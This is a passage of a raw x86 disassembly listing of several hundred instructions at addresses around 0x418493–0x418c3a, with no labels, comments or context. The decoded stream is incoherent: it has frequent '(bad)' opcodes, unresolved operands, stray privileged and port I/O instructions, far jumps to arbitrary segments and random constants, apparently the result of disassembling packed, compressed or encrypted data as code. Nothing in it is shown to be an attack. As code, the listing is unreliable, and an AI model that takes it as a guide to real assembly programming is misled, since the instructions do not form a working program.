  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	imul   ebp,DWORD PTR [esi-0x232fd0e9],0xa46860db
  4184a1:	and    BYTE PTR [edi-0x6c],al
  4184a4:	js     0x41848b
  4184a6:	enter  0x1e04,0x8c
  4184aa:	sbb    DWORD PTR [eax+0x55a9a2ab],0xed428d06
  4184b4:	call   0x9972:0xa3d817dd
  4184bb:	arpl   WORD PTR [eax],si
  4184bd:	ds je  0x4184f7
  4184c0:	jmp    0xcee99be9
  4184c5:	test   DWORD PTR [edi+0x30],0x987523e2
  4184cc:	inc    esp
  4184cd:	pop    esp
  4184ce:	xchg   esp,eax
  4184cf:	(bad)  
  4184d0:	push   edx
  4184d1:	mov    dl,BYTE PTR [esi]
  4184d3:	mov    ds:0xf09f46df,al
  4184d8:	lea    eax,[edx+edx*4-0x2861ec18]
  4184df:	ins    BYTE PTR es:[edi],dx
  4184e0:	sbb    al,0xc4
  4184e3:	mov    ds,WORD PTR [esi-0x24]
  4184e6:	mov    bl,0x5a
  4184e8:	push   esp
  4184e9:	mov    es,WORD PTR [ebp-0x5c]
  4184ec:	jp     0x418510
  4184ee:	aad    0xda
  4184f0:	dec    ebp
  4184f1:	stc    
  4184f2:	mov    edx,0x2fd8724
  4184f7:	ja     0x418484
  4184f9:	mov    ah,0x6b
  4184fb:	mov    ah,0x60
  4184fd:	out    dx,al
  4184fe:	sbb    cl,bh
  418500:	xchg   esp,eax
  418501:	mov    al,ds:0xc362bf48
  418506:	mov    dl,0x1a
  418508:	test   BYTE PTR [esp+ecx*1],ah
  41850b:	cmc    
  41850c:	loop   0x418561
  41850e:	inc    ebx
  41850f:	or     DWORD PTR [edi+edi*8-0x1e],esp
  418513:	mov    ecx,0x698bac48
  418518:	mov    dl,0x22
  41851a:	call   0x285e33c0
  41851f:	mov    eax,ds:0xc139e8e0
  418524:	std    
  418525:	mov    dl,0x76
  418527:	mov    cl,0x42
  418529:	fidiv  DWORD PTR [edx+edx*4]
  41852c:	inc    ebp
  41852d:	dec    ebx
  41852e:	lods   eax,DWORD PTR ds:[esi]
  41852f:	popf   
  418530:	inc    ecx
  418531:	xor    al,dh
  418533:	xor    DWORD PTR [edi+0x699f32b4],ecx
  418539:	test   BYTE PTR [ebx-0x65],bl
  41853c:	ja     0x4185bd
  41853e:	(bad)  
  41853f:	sti    
  418540:	or     DWORD PTR [ecx],ecx
  418542:	retf   0x44c3
  418545:	mov    ecx,DWORD PTR [esi-0x78fc96ed]
  41854b:	aam    0x8e
  41854d:	xor    BYTE PTR [esi],0xd1
  418550:	out    0x2f,al
  418552:	fistp  QWORD PTR [ecx+edx*2-0x517a2a83]
  418559:	pop    ds
  41855a:	mov    eax,ds:0x4ea56ad
  41855f:	cld    
  418560:	sub    eax,0x4214f7db
  418565:	cdq    
  418566:	pop    es
  418567:	rcl    BYTE PTR [eax+edx*1],0xe0
  41856b:	cdq    
  41856c:	xorps  xmm2,XMMWORD PTR [edi-0x79]
  418570:	add    al,0x50
  418572:	jo     0x418576
  418574:	ds je  0x4184f7
  418577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418579:	fmul   st(7),st
  41857b:	bound  eax,QWORD PTR [ebp-0x75]
  41857e:	or     DWORD PTR [edi+0x643012eb],edx
  418584:	xchg   edi,eax
  418585:	loope  0x41859e
  418587:	test   BYTE PTR [eax+0x3e366b73],dl
  41858d:	(bad)  [esi+0x64bd8218]
  418593:	aaa    
  418594:	ret    
  418595:	push   ds
  418596:	mov    bl,0x6
  418598:	push   edi
  418599:	and    BYTE PTR fs:[ebx+ecx*2+0x11b47b76],dl
  4185a1:	div    ebx
  4185a3:	push   eax
  4185a4:	fbstp  TBYTE PTR [esi-0x6ffe8472]
  4185aa:	fistp  QWORD PTR [esi-0x5f]
  4185ad:	mov    edi,DWORD PTR [edx]
  4185af:	cmp    eax,0xed70e239
  4185b4:	lahf   
  4185b5:	mov    ebp,0x9ee743e3
  4185ba:	push   0x6c
  4185bc:	pop    eax
  4185bd:	clc    
  4185be:	dec    edi
  4185bf:	add    eax,0xbae4ad2a
  4185c4:	retf   
  4185c5:	inc    esp
  4185c6:	mov    WORD PTR [ecx],cs
  4185c8:	sub    al,BYTE PTR [ebp+0x4e]
  4185cb:	test   DWORD PTR [eax+ecx*2-0x4daa8c50],edi
  4185d2:	jae    0x41863c
  4185d4:	push   ds
  4185d5:	sub    esi,0xffffffd4
  4185d8:	into   
  4185d9:	pop    ss
  4185da:	rol    BYTE PTR [esi],1
  4185dc:	jecxz  0x418606
  4185de:	repz inc edi
  4185e0:	fs jo  0x41859a
  4185e3:	inc    ebx
  4185e4:	push   0xe93c4be3
  4185e9:	ins    DWORD PTR es:[edi],dx
  4185ea:	scas   al,BYTE PTR es:[edi]
  4185eb:	push   cs
  4185ec:	inc    BYTE PTR [esi+esi*1]
  4185ef:	add    eax,0xa62a9b31
  4185f4:	inc    ebx
  4185f5:	jns    0x4185c9
  4185f7:	xor    esp,DWORD PTR [ebx-0x5214b62]
  4185fd:	xor    al,0xaa
  4185ff:	xor    BYTE PTR [eax-0x7b],0x7f
  418603:	inc    esi
  418604:	dec    ecx
  418605:	adc    eax,DWORD PTR [ebx-0xa]
  418608:	pop    edi
  418609:	inc    ecx
  41860a:	out    0x7e,al
  41860c:	outs   dx,BYTE PTR ds:[esi]
  41860d:	pop    ebx
  41860e:	(bad)  
  41860f:	in     al,0xba
  418611:	test   ecx,ecx
  418613:	(bad)  
  418614:	sbb    eax,0x9548e817
  418619:	sbb    dl,ah
  41861b:	repz and edx,esp
  41861e:	xchg   BYTE PTR [ebp+0x55],dl
  418621:	test   dl,ah
  418623:	inc    ecx
  418624:	les    ecx,FWORD PTR [ecx-0x21766cdc]
  41862a:	mov    ebp,0xbdffd469
  41862f:	pop    edi
  418630:	shl    ah,0x91
  418633:	rcr    DWORD PTR [eax+eax*1-0x4bb73a3a],cl
  41863a:	and    eax,0xd5d8d01b
  41863f:	fnstcw WORD PTR [ecx+eiz*1]
  418642:	inc    edx
  418643:	test   dh,al
  418645:	push   esp
  418646:	cmp    DWORD PTR [eax+eiz*1+0x29],edi
  41864a:	jnp    0x418682
  41864c:	mov    ah,0xcd
  41864e:	cwde   
  41864f:	jmp    0xdac:0x5f82e4a
  418656:	pop    ecx
  418657:	in     al,dx
  418658:	sbb    eax,0x63389c9f
  41865d:	shr    ecx,1
  41865f:	xchg   ebp,eax
  418660:	retf   
  418661:	xor    esp,DWORD PTR [eax]
  418663:	jno    0x41860e
  418665:	xlat   BYTE PTR ds:[ebx]
  418666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418667:	xchg   edx,eax
  418668:	sub    eax,0x8d66386e
  41866d:	pusha  
  41866e:	push   ebp
  41866f:	cli    
  418670:	ret    0x8a4a
  418673:	xor    edx,eax
  418675:	clc    
  418676:	mov    edx,0x44e24b5
  41867b:	rcl    DWORD PTR [edi-0x9],0xb1
  41867f:	clc    
  418680:	inc    edi
  418681:	stos   BYTE PTR es:[edi],al
  418682:	pop    ebp
  418683:	stc    
  418684:	repz into 
  418686:	add    edx,0x48038ee3
  41868c:	mov    eax,ds:0xf1dcb863
  418691:	xchg   esp,eax
  418692:	mov    DWORD PTR ds:0xe14da360,edi
  418698:	mov    ss:0x61e76bfe,eax
  41869e:	lea    ebx,[edx+0x66]
  4186a1:	(bad)  
  4186a2:	cld    
  4186a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a4:	jg     0x4186a2
  4186a6:	mov    bl,0xe5
  4186a8:	push   edi
  4186a9:	or     eax,0x96034d34
  4186ae:	in     al,dx
  4186af:	xchg   esi,eax
  4186b0:	xor    cl,BYTE PTR [edi-0x10d93b8b]
  4186b6:	jmp    0x124b:0x116b8f8f
  4186bd:	sbb    BYTE PTR [edi+eiz*1-0x3b],ah
  4186c1:	dec    esi
  4186c2:	bound  edx,QWORD PTR [ecx+0x18b2f6a2]
  4186c8:	retf   0x554
  4186cb:	xchg   ebp,eax
  4186cc:	int3   
  4186cd:	mov    dh,0xea
  4186cf:	(bad)  
  4186d0:	jmp    0x618059c7
  4186d5:	pop    ss
  4186d6:	push   0xffffffdd
  4186d8:	dec    edx
  4186d9:	std    
  4186da:	lock pop es
  4186dc:	xlat   BYTE PTR ds:[ebx]
  4186dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186de:	push   cs
  4186df:	imul   esp,edx,0xffffffa9
  4186e2:	in     al,0xd9
  4186e4:	pop    ebp
  4186e5:	pop    esp
  4186e6:	jecxz  0x418712
  4186e8:	sub    DWORD PTR [edx+eax*4],0xffffffed
  4186ec:	sub    BYTE PTR [ebx+0xfd31383],bl
  4186f2:	fiadd  DWORD PTR [edx+eiz*8+0x1d]
  4186f6:	ds push ecx
  4186f8:	bound  ecx,QWORD PTR [eax]
  4186fa:	loop   0x4186d8
  4186fc:	pop    esi
  4186fd:	outs   dx,BYTE PTR ds:[esi]
  4186fe:	out    0xc3,al
  418700:	xchg   BYTE PTR [ebp+esi*8+0x20],ch
  418704:	rcl    DWORD PTR [eax+0x16],cl
  418707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418708:	dec    edx
  418709:	lock lock dec esp
  41870c:	rcl    bl,1
  41870e:	or     al,0x5c
  418710:	xchg   edi,eax
  418711:	jne    0x4186c6
  418713:	bound  edx,QWORD PTR [eax]
  418715:	mov    dl,BYTE PTR [eax]
  418717:	int    0xaa
  418719:	pop    esp
  41871a:	pop    ss
  41871b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41871c:	lock push edx
  41871e:	mov    edi,0x20dccb5b
  418723:	pop    es
  418724:	xchg   ebx,eax
  418725:	outs   dx,DWORD PTR ds:[esi]
  418726:	dec    esi
  418727:	out    0x5b,al
  418729:	pop    eax
  41872a:	inc    ebx
  41872b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41872c:	pop    esi
  41872d:	push   edx
  41872e:	xchg   ecx,eax
  41872f:	js     0x4186db
  418731:	repnz inc esp
  418733:	jmp    0x159e327d
  418738:	inc    edi
  418739:	or     al,0xe4
  41873b:	cmp    BYTE PTR [edx-0x4353ae42],bl
  418741:	mov    edi,0x331c2b6c
  418746:	jg     0x418749
  418748:	ins    BYTE PTR es:[edi],dx
  418749:	add    esi,DWORD PTR [ecx+eax*4]
  41874c:	or     bh,cl
  41874e:	pop    eax
  41874f:	mov    ch,0xcd
  418751:	aas    
  418752:	xchg   DWORD PTR [edx],edx
  418754:	mov    fs,WORD PTR ds:0x451cfe18
  41875a:	outs   dx,DWORD PTR ds:[esi]
  41875b:	or     BYTE PTR [esp+eax*4+0x6b],bh
  41875f:	rcl    BYTE PTR [edx-0x4cfc8afe],0x88
  418766:	mov    cl,al
  418768:	js     0x4187d7
  41876a:	in     eax,0x46
  41876c:	xor    DWORD PTR [edi],0x69
  41876f:	repz pop ebp
  418771:	sbb    al,0x39
  418773:	or     ebp,DWORD PTR [ecx-0x615e7b9a]
  418779:	scas   al,BYTE PTR es:[edi]
  41877a:	fimul  WORD PTR [esi-0x5d]
  41877d:	ins    DWORD PTR es:[edi],dx
  41877e:	lea    esi,[esi]
  418780:	out    0x9,al
  418782:	pop    es
  418783:	jns    0x418793
  418785:	punpcklbw mm4,DWORD PTR [ebx]
  418788:	mov    dh,0x3c
  41878a:	leave  
  41878b:	(bad)  
  41878c:	pop    eax
  41878d:	sub    al,0x32
  41878f:	inc    edx
  418790:	pavgb  mm2,QWORD PTR [ebp+0x2f]
  418794:	xor    DWORD PTR [esi-0x2],0x3f
  418798:	adc    ebx,DWORD PTR [edx-0x2f9cf16a]
  41879e:	js     0x418784
  4187a0:	loopne 0x418748
  4187a2:	pop    es
  4187a3:	mov    ebx,DWORD PTR [ecx+0x2b]
  4187a6:	xchg   edi,eax
  4187a7:	mov    bh,0x74
  4187a9:	push   0xffffffc3
  4187ab:	and    al,0xdd
  4187ad:	xor    al,0x61
  4187af:	pop    edx
  4187b0:	in     al,dx
  4187b1:	push   edx
  4187b2:	pop    esi
  4187b3:	adc    BYTE PTR [ebp+0x46],ah
  4187b6:	fidivr DWORD PTR [ecx+0x535408f9]
  4187bc:	push   ebx
  4187bd:	fnstsw WORD PTR [eax-0x26]
  4187c0:	fcmovnu st,st(5)
  4187c2:	fst    st(2)
  4187c4:	sbb    BYTE PTR [esi+edx*2+0x76],bl
  4187c8:	mov    ?,ebx
  4187ca:	mov    edx,0x6389e852
  4187cf:	bound  esi,QWORD PTR [ecx+eax*2+0x38]
  4187d3:	adc    BYTE PTR [edx-0x71],ch
  4187d6:	pop    ds
  4187d7:	mov    esp,0x3303a680
  4187dc:	xchg   ecx,eax
  4187dd:	mov    edx,0x38f48110
  4187e2:	add    al,0x60
  4187e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e5:	add    eax,0x15eda8fe
  4187ea:	fmul   QWORD PTR [ebx+eiz*4+0x78e57099]
  4187f1:	mov    eax,ds:0x6611ad6a
  4187f6:	xor    eax,ebx
  4187f8:	lods   eax,DWORD PTR ds:[esi]
  4187f9:	mov    bh,0xe1
  4187fb:	xchg   ecx,eax
  4187fc:	or     eax,0xc412e0cf
  418801:	push   eax
  418802:	inc    ebx
  418803:	sbb    DWORD PTR ds:0x520ff63b,edx
  418809:	stos   BYTE PTR es:[edi],al
  41880a:	repz xor al,BYTE PTR [ebx+0x3147b20]
  418811:	inc    edx
  418812:	enter  0xbb85,0x5
  418816:	das    
  418817:	adc    eax,0x5a6d2832
  41881c:	pop    ebp
  41881d:	jl     0x418847
  41881f:	sub    eax,0x75d7423
  418824:	retf   
  418825:	int    0x7c
  418827:	sar    dh,0x7b
  41882a:	out    dx,al
  41882b:	mov    al,0x7e
  41882d:	or     edx,DWORD PTR [edx+0x4d92bdc2]
  418833:	mov    ds,esi
  418835:	cmp    BYTE PTR ds:[ebx+esi*2+0x6b],al
  41883a:	push   eax
  41883b:	call   0x8037cc73
  418840:	pusha  
  418841:	out    0x56,eax
  418843:	sar    ch,0x67
  418846:	imul   edi,DWORD PTR [ebx],0xffffffcd
  418849:	call   0x232040b8
  41884e:	fbld   TBYTE PTR [ecx+0x3b618093]
  418854:	jmp    0xed36:0x9c879357
  41885b:	mov    ss,WORD PTR [esi-0x12d6d5b9]
  418861:	(bad)  
  418862:	scas   eax,DWORD PTR es:[edi]
  418863:	mov    ebx,?
  418865:	xchg   BYTE PTR [edx-0x113df3d2],dh
  41886b:	mov    ecx,0x7f7b52b4
  418870:	mov    dl,0xf6
  418872:	inc    esi
  418873:	inc    ecx
  418874:	xchg   ebp,eax
  418875:	sub    bl,BYTE PTR [esi-0x15]
  418878:	and    DWORD PTR [ebp-0x20],ebx
  41887b:	xchg   DWORD PTR [ebx],ebp
  41887d:	popf   
  41887e:	into   
  41887f:	out    dx,eax
  418880:	inc    DWORD PTR [ebp-0x6]
  418883:	cli    
  418884:	popf   
  418885:	jge    0x41884e
  418887:	xor    dh,BYTE PTR [ebp+0x56]
  41888a:	aas    
  41888b:	bound  eax,QWORD PTR [eax]
  41888d:	xchg   BYTE PTR [edx+0x5f947d2c],al
  418893:	pop    ss
  418894:	icebp  
  418895:	push   ebp
  418896:	iret   
  418897:	es inc esi
  418899:	jmp    0x418836
  41889b:	adc    al,0x42
  41889d:	mov    esp,0x216aeee9
  4188a2:	ficom  DWORD PTR [ecx+ebx*4-0x71]
  4188a6:	(bad)  
  4188a7:	xchg   ecx,eax
  4188a8:	das    
  4188a9:	push   cs
  4188aa:	clc    
  4188ab:	(bad)  
  4188ac:	ins    BYTE PTR es:[edi],dx
  4188ad:	cmc    
  4188ae:	rcr    DWORD PTR [edx],1
  4188b0:	pop    ds
  4188b1:	popf   
  4188b2:	mov    al,ds:0x96daaabf
  4188b7:	daa    
  4188b8:	enter  0x4863,0x8d
  4188bc:	imul   esp,DWORD PTR [ecx],0xb88aec14
  4188c2:	or     eax,0x4e2ec998
  4188c7:	mov    cl,0x74
  4188c9:	cmp    DWORD PTR [esi-0x7102eedb],esp
  4188cf:	inc    edx
  4188d0:	aad    0xff
  4188d2:	scas   eax,DWORD PTR es:[edi]
  4188d3:	mov    esi,0xd4f334ba
  4188d8:	inc    esi
  4188d9:	mov    al,ds:0x29963df6
  4188de:	jnp    0x41894a
  4188e0:	cmp    al,BYTE PTR [edi]
  4188e2:	dec    esp
  4188e3:	sbb    ah,BYTE PTR [ebp-0x1164cbb4]
  4188e9:	xchg   esp,eax
  4188ea:	xor    ebx,DWORD PTR ds:0x90897f0b
  4188f0:	jg     0x41889c
  4188f2:	fiadd  DWORD PTR [esi+0x13]
  4188f5:	sahf   
  4188f6:	add    ecx,0x12
  4188f9:	pop    edx
  4188fa:	cmp    bh,BYTE PTR [edi]
  4188fc:	jo     0x41894f
  4188fe:	lods   eax,DWORD PTR ds:[esi]
  4188ff:	ret    0x5bf7
  418902:	dec    edi
  418903:	js     0x418910
  418905:	fld    TBYTE PTR [esi+esi*2]
  418908:	dec    ah
  41890a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41890b:	cli    
  41890c:	dec    ecx
  41890d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890e:	std    
  41890f:	call   0x259492b2
  418914:	mov    bl,0xff
  418916:	(bad)  [ebx+eax*2+0x67d1f3af]
  41891d:	and    bl,ah
  41891f:	mov    esi,DWORD PTR [ebx+ebp*2]
  418922:	stos   DWORD PTR es:[edi],eax
  418923:	lods   al,BYTE PTR ds:[esi]
  418924:	jl     0x418940
  418926:	add    BYTE PTR [edi+0x71398856],0x21
  41892d:	(bad)  [edi-0x6b]
  418930:	int    0x3a
  418932:	sti    
  418933:	popf   
  418934:	and    al,0x6f
  418936:	cld    
  418937:	out    0xfb,eax
  418939:	dec    esi
  41893a:	xchg   ecx,eax
  41893b:	aam    0xec
  41893d:	into   
  41893e:	imul   edx,DWORD PTR [esi],0x11
  418941:	sbb    DWORD PTR [edi-0x6e],edi
  418944:	and    DWORD PTR [ebx+0x6b],esp
  418947:	inc    ebp
  418948:	xor    DWORD PTR [ebx-0x32],edx
  41894b:	pop    eax
  41894c:	mov    BYTE PTR [edi],bl
  41894e:	push   ecx
  41894f:	and    bh,bl
  418951:	repnz or BYTE PTR ds:0xcf679c74,ah
  418958:	nop
  418959:	ror    esi,cl
  41895b:	mov    eax,0x1c34a177
  418960:	or     eax,0xb01d385f
  418965:	mov    ds:0xd4bdc009,eax
  41896a:	push   edx
  41896b:	jg     0x41894b
  41896d:	cdq    
  41896e:	rcl    ebp,cl
  418970:	imul   esi,DWORD PTR [edx],0xffffffc8
  418973:	jmp    0xe770fed
  418978:	jecxz  0x4189f7
  41897a:	(bad)  
  41897c:	fst    st(7)
  41897e:	pop    edi
  41897f:	push   0x95467a16
  418984:	in     eax,0x1b
  418986:	cmp    ebp,DWORD PTR [ebx]
  418988:	in     eax,dx
  418989:	das    
  41898a:	adc    al,0x60
  41898c:	es pop ds
  41898e:	bound  edx,QWORD PTR [eax]
  418990:	bound  edx,QWORD PTR [edx+0x1d]
  418993:	add    BYTE PTR [edi+ecx*8],ah
  418996:	xchg   ebp,eax
  418997:	push   edx
  418998:	jnp    0x4189de
  41899a:	mov    ebp,ebp
  41899c:	out    dx,eax
  41899d:	lds    esp,FWORD PTR [ebx]
  41899f:	push   ss
  4189a0:	out    dx,al
  4189a1:	jmp    0x418969
  4189a3:	or     dl,BYTE PTR [ecx-0x23]
  4189a6:	mov    ecx,0xefa141b
  4189ab:	push   ecx
  4189ac:	arpl   WORD PTR [edx+0x38],sp
  4189af:	popf   
  4189b0:	(bad)  
  4189b1:	push   esi
  4189b2:	push   edi
  4189b3:	scas   al,BYTE PTR es:[edi]
  4189b4:	fdivrp st(1),st
  4189b6:	aam    0xbb
  4189b8:	and    ebx,ecx
  4189ba:	adc    eax,0x7740670e
  4189bf:	xchg   ebp,eax
  4189c0:	xchg   esi,eax
  4189c1:	sbb    al,0xe6
  4189c3:	pop    es
  4189c4:	(bad)  
  4189c5:	js     0x4189bd
  4189c7:	push   0xf26fb7d3
  4189cc:	push   edx
  4189cd:	mov    ss,WORD PTR [ebp+0x23]
  4189d0:	xor    al,0xb4
  4189d2:	cwde   
  4189d3:	clc    
  4189d4:	adc    ebx,esp
  4189d6:	js     0x4189d0
  4189d8:	jo     0x4189c1
  4189da:	mov    ah,0xc6
  4189dc:	mov    ch,0x7f
  4189de:	mov    ah,0xb9
  4189e0:	ins    DWORD PTR es:[edi],dx
  4189e1:	lds    ebx,FWORD PTR ds:0x93a87d80
  4189e7:	inc    esp
  4189e8:	xchg   ebp,eax
  4189e9:	or     dh,BYTE PTR [edi]
  4189eb:	mov    esi,0x805e940f
  4189f0:	(bad)  
  4189f1:	shl    BYTE PTR [ebx],1
  4189f3:	test   BYTE PTR [edx+0x77656fa0],ah
  4189f9:	or     ah,0xa2
  4189fc:	leave  
  4189fd:	xchg   ebx,eax
  4189fe:	bound  esi,QWORD PTR [ebx]
  418a00:	js     0x4189be
  418a02:	aad    0xf0
  418a04:	ret    
  418a05:	xchg   esi,eax
  418a06:	nop
  418a07:	jg     0x4189c4
  418a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a0a:	stos   BYTE PTR es:[edi],al
  418a0b:	xchg   esi,eax
  418a0c:	fwait
  418a0d:	mov    eax,ds:0x90af2c97
  418a12:	mov    al,0x90
  418a14:	sub    eax,0xe99a4e4a
  418a19:	push   edx
  418a1a:	aas    
  418a1b:	dec    esp
  418a1c:	or     edi,DWORD PTR [ebx-0x466f348c]
  418a22:	ins    DWORD PTR es:[edi],dx
  418a23:	mov    al,0x4c
  418a25:	adc    BYTE PTR [esi],ah
  418a27:	retf   
  418a28:	pop    ss
  418a29:	outs   dx,BYTE PTR ds:[esi]
  418a2a:	and    al,0x9d
  418a2c:	int    0x73
  418a2e:	dec    ebx
  418a2f:	mov    ds:0x799e0922,eax
  418a34:	fiadd  DWORD PTR [ebx+ecx*1+0xa26d446]
  418a3b:	or     eax,0x8d335f98
  418a40:	sub    al,0x1c
  418a42:	pop    eax
  418a43:	gs mov ch,0x69
  418a46:	push   ebp
  418a47:	js     0x418a3e
  418a49:	aaa    
  418a4a:	imul   ecx,DWORD PTR [eax],0xffffff92
  418a4d:	fld    DWORD PTR [ebx+0x4fd9c13e]
  418a53:	push   edx
  418a54:	pop    es
  418a55:	pop    ss
  418a56:	fidiv  DWORD PTR [ebp+0x5a]
  418a59:	scas   eax,DWORD PTR es:[edi]
  418a5a:	mov    ebx,0x14738bfd
  418a5f:	jle    0x418aa4
  418a61:	and    BYTE PTR [ebx-0x607d6de2],dl
  418a67:	pop    esi
  418a68:	in     eax,0xce
  418a6a:	nop
  418a6b:	out    0x85,eax
  418a6d:	sahf   
  418a6e:	sub    eax,0xd0d9457e
  418a73:	ror    BYTE PTR [esi+0x751c76b],cl
  418a79:	or     eax,0xfc13f3ff
  418a7e:	sub    DWORD PTR [ebp-0x3f],esi
  418a81:	gs retf 0xfdc2
  418a85:	jecxz  0x418b00
  418a87:	dec    ebp
  418a88:	scas   al,BYTE PTR es:[edi]
  418a89:	gs into 
  418a8b:	lock push esi
  418a8d:	mov    bh,0x51
  418a8f:	retf   
  418a90:	push   edi
  418a91:	cli    
  418a92:	clc    
  418a93:	add    ch,BYTE PTR [ebp-0x75]
  418a96:	mov    eax,0x32f4181f
  418a9b:	jge    0x418a84
  418a9d:	int3   
  418a9e:	jb     0x418a58
  418aa0:	cmp    ecx,0x7bad67e4
  418aa6:	mov    eax,0xb9b82ae5
  418aab:	je     0x418aac
  418aad:	popa   
  418aae:	in     al,dx
  418aaf:	sub    BYTE PTR [edi+esi*4-0x55],bl
  418ab3:	adc    al,0x73
  418ab5:	stos   BYTE PTR es:[edi],al
  418ab6:	sub    al,0xd4
  418ab8:	xchg   edi,eax
  418ab9:	stos   BYTE PTR es:[edi],al
  418aba:	retf   
  418abb:	push   esp
  418abc:	(bad)  
  418abe:	push   es
  418abf:	in     al,0xad
  418ac1:	xchg   edi,eax
  418ac2:	jg     0x418ab5
  418ac4:	mov    bl,0xe
  418ac6:	sbb    bh,cl
  418ac8:	fdivr  DWORD PTR [ebx]
  418aca:	addr16 into 
  418acc:	adc    DWORD PTR [esi-0x3b],ebp
  418acf:	dec    eax
  418ad0:	push   cs
  418ad1:	enter  0x68cb,0x94
  418ad5:	lea    esp,ds:[eax]
  418ad8:	xor    DWORD PTR [ebx],0x377f32e3
  418ade:	add    eax,DWORD PTR [ebp-0x32c87c9]
  418ae4:	dec    edx
  418ae5:	dec    edi
  418ae6:	jle    0x418abb
  418ae8:	dec    edx
  418ae9:	dec    DWORD PTR [ebp+0xf]
  418aec:	add    eax,0x234dda15
  418af1:	fild   WORD PTR [eax-0x77df7d4e]
  418af7:	dec    ebp
  418af8:	inc    edx
  418af9:	int    0x70
  418afb:	jo     0x418b03
  418afd:	jns    0x418aa1
  418aff:	adc    BYTE PTR [eax],0xa6
  418b02:	loop   0x418b36
  418b04:	mov    esi,0xf6444f80
  418b09:	sub    bl,BYTE PTR [eax-0x61]
  418b0c:	inc    edx
  418b0d:	xor    ah,BYTE PTR [esi]
  418b0f:	dec    ecx
  418b10:	push   esi
  418b11:	sbb    DWORD PTR [ecx+0x20],ecx
  418b14:	xchg   ebp,eax
  418b15:	(bad)  
  418b16:	repz push edx
  418b18:	enter  0x5792,0xb5
  418b1c:	aas    
  418b1d:	repz push edx
  418b1f:	push   0xba4f59ea
  418b24:	jecxz  0x418b96
  418b26:	inc    ebp
  418b27:	xor    al,0x53
  418b29:	jecxz  0x418b04
  418b2b:	outs   dx,DWORD PTR cs:[esi]
  418b2d:	adc    BYTE PTR [eax-0x5c],cl
  418b30:	jle    0x418b5f
  418b32:	jno    0x418b09
  418b34:	mov    cl,0xd7
  418b36:	add    al,0x75
  418b38:	ret    0xece4
  418b3b:	in     eax,0xbc
  418b3d:	xlat   BYTE PTR ds:[ebx]
  418b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3f:	lods   eax,DWORD PTR ds:[esi]
  418b40:	ss mov esp,0x54ea9585
  418b46:	ret    0x5467
  418b49:	stc    
  418b4a:	cmc    
  418b4b:	fdiv   st(7),st
  418b4d:	jle    0x418b6d
  418b4f:	les    esi,FWORD PTR [edx-0x18a78a67]
  418b55:	jl     0x418af1
  418b57:	jne    0x418b76
  418b59:	sar    BYTE PTR [edi+ebp*4+0xc],0xa5
  418b5e:	jne    0x418b33
  418b60:	xchg   ebp,eax
  418b61:	jmp    0xedd0ddf5
  418b66:	adc    dh,dl
  418b68:	fstp   QWORD PTR [edx+0x2b]
  418b6b:	jbe    0x418b54
  418b6d:	mov    esp,0xf2effa72
  418b72:	ds ror al,cl
  418b75:	dec    esi
  418b76:	mov    ds:0xa6088710,al
  418b7b:	xchg   ecx,eax
  418b7c:	cs xor eax,0xa15da494
  418b82:	push   es
  418b83:	cmp    al,0x93
  418b85:	cdq    
  418b86:	call   edi
  418b88:	je     0x418b1c
  418b8a:	cmp    bh,0xe2
  418b8d:	mov    ebx,0xbd1b637f
  418b92:	add    ah,ah
  418b94:	xchg   DWORD PTR [edi+0x72],esp
  418b97:	in     eax,0x6
  418b99:	dec    ecx
  418b9a:	pmuludq mm4,mm1
  418b9d:	and    al,0x3b
  418b9f:	mov    edx,0xd7690786
  418ba4:	aam    0xaa
  418ba6:	push   0xc4f4cf0e
  418bab:	push   0x70bb591c
  418bb0:	in     eax,dx
  418bb1:	pop    edi
  418bb2:	sub    BYTE PTR [ecx-0x496131c9],ah
  418bb8:	add    esp,edx
  418bba:	ds jo  0x418c3c
  418bbd:	std    
  418bbe:	and    eax,0x853b8aae
  418bc3:	cmp    BYTE PTR [eax],al
  418bc5:	lods   al,BYTE PTR ds:[esi]
  418bc6:	or     DWORD PTR [edi-0x6abf95ef],eax
  418bcc:	repnz pop ebx
  418bce:	xor    eax,0x4491313b
  418bd3:	pop    esp
  418bd4:	xchg   ebx,eax
  418bd5:	iret   
  418bd6:	bound  esp,QWORD PTR [ebp+esi*1+0xe]
  418bda:	ror    bl,0x7c
  418bdd:	mov    edi,0xe2a96a1
  418be2:	mov    DWORD PTR [ebp+0xd],ecx
  418be5:	dec    edi
  418be6:	xchg   ah,dl
  418be8:	mov    bh,0x82
  418bea:	pop    esi
  418beb:	lea    ebp,[ebx+0x44cba729]
  418bf1:	mov    fs,WORD PTR [ecx+eax*8-0xc6ffe1]
  418bf8:	mov    ebx,0xe3dc9fe3
  418bfd:	push   ecx
  418bfe:	or     eax,0xe0344f6d
  418c03:	pop    esi
  418c04:	es out dx,al
  418c06:	in     al,dx
  418c07:	icebp  
  418c08:	fnstsw WORD PTR [eax-0x52e1aab0]
  418c0e:	int3   
  418c0f:	stos   BYTE PTR es:[edi],al
  418c10:	popa   
  418c11:	jecxz  0x418c39
  418c13:	pop    esp
  418c14:	rol    BYTE PTR [ebx],1
  418c16:	pop    ecx
  418c17:	push   ss
  418c18:	les    ebp,FWORD PTR [ecx+0x18]
  418c1b:	out    dx,al
  418c1c:	test   al,0x45
  418c1e:	inc    ebx
  418c1f:	into   
  418c20:	mov    cl,0x1d
  418c22:	cmp    eax,0xd119c48d
  418c27:	test   eax,0xcbb6619a
  418c2c:	xchg   BYTE PTR [edx+0x5c],ah
  418c2f:	dec    esi
  418c31:	xlat   BYTE PTR ds:[ebx]
  418c32:	xor    ecx,eax
  418c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c35:	push   0xee91df9f
  418c3a:	xor    al,0x99
